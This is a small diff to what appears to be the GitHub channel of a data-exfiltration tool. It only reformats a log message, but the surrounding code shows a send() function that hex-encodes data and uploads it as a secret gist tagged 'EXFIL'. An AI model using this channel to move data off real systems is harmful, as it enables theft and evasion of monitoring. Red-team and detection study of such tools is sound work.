@@ -7,7 +7,9 @@ app_exfiltrate = None
 g = None
 
 def send(data):
-    app_exfiltrate.log_message('info', "[github] Sending {} bytes with Github".format(len(data)))
+    app_exfiltrate.log_message(
+        'info', f"[github] Sending {len(data)} bytes with Github"
+    )
     g.get_user().create_gist(False, {'foobar.txt': github.InputFileContent(data.encode('hex'))}, 'EXFIL')
 
 def listen():
